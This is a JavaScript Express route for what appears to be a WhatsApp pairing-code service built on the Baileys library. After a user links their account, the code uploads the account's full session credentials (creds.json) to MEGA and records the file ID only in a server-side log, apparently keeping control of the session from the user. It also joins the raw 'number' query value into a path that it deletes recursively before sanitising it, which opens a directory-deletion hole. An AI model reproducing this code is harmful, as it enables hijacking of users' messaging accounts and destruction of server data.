import express from "express";
import fs from "fs";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import pn from "awesome-phonenumber";
import { upload } from "./mega.js";

const router = express.Router();

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error("Error removing file:", e);
    }
}

function getMegaFileId(url) {
    try {
        const match = url.match(/\/file\/([^#]+#[^\/]+)/);
        return match ? match[1] : null;
    } catch (error) {
        return null;
    }
}

router.get("/", async (req, res) => {
    let num = req.query.number;
    if (!num) {
        return res.status(400).send({ code: "Phone number is required" });
    }

    let dirs = "./" + num;
    await removeFile(dirs);

    num = num.replace(/[^0-9]/g, "");

    const phone = pn("+" + num);
    if (!phone.isValid()) {
        return res.status(400).send({
            code: "Invalid phone number. Use full international format without +",
        });
    }

    num = phone.getNumber("e164").replace("+", "");

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version } = await fetchLatestBaileysVersion();

            const KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" })
                    ),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }),
                browser: Browsers.windows("Chrome"),
            });

            KnightBot.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === "open") {
                    console.log("✅ Connected successfully!");
                    console.log("📱 Uploading session to MEGA...");

                    try {
                        const credsPath = dirs + "/creds.json";

                        const megaUrl = await upload(
                            credsPath,
                            `creds_${num}_${Date.now()}.json`
                        );

                        const megaFileId = getMegaFileId(megaUrl);

                        if (megaFileId) {
                            console.log("✅ MEGA Upload Success!");
                            console.log("📁 File ID:", megaFileId);

                            // Save only in server
                            fs.writeFileSync(
                                "./mega_sessions.txt",
                                `Number: ${num} | FileID: ${megaFileId}\n`,
                                { flag: "a" }
                            );

                            console.log("💾 Saved to mega_sessions.txt");
                        } else {
                            console.log("❌ Failed to extract MEGA file ID");
                        }

                        console.log("🧹 Cleaning up session...");
                        await delay(1000);
                        removeFile(dirs);

                        console.log("🛑 Shutting down...");
                        await delay(2000);
                        process.exit(0);

                    } catch (error) {
                        console.error("❌ MEGA Upload Error:", error);
                        removeFile(dirs);
                        await delay(2000);
                        process.exit(1);
                    }
                }

                if (connection === "close") {
                    const statusCode =
                        lastDisconnect?.error?.output?.statusCode;

                    if (statusCode === 401) {
                        console.log("❌ Logged out. Need new pairing.");
                    } else {
                        console.log("🔁 Restarting session...");
                        initiateSession();
                    }
                }
            });

            if (!KnightBot.authState.creds.registered) {
                await delay(3000);

                try {
                    let code = await KnightBot.requestPairingCode(num);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;

                    if (!res.headersSent) {
                        console.log("📲 Pairing Code:", code);
                        await res.send({ code });
                    }
                } catch (error) {
                    console.error("Pairing Error:", error);
                    if (!res.headersSent) {
                        res.status(503).send({
                            code: "Failed to get pairing code",
                        });
                    }
                    setTimeout(() => process.exit(1), 2000);
                }
            }

            KnightBot.ev.on("creds.update", saveCreds);

        } catch (err) {
            console.error("Session Error:", err);
            if (!res.headersSent) {
                res.status(503).send({ code: "Service Unavailable" });
            }
            setTimeout(() => process.exit(1), 2000);
        }
    }

    await initiateSession();
});

process.on("uncaughtException", (err) => {
    let e = String(err);
    if (
        e.includes("conflict") ||
        e.includes("not-authorized") ||
        e.includes("timeout") ||
        e.includes("rate-overlimit")
    )
        return;

    console.log("Caught exception:", err);
    process.exit(1);
});

export default router;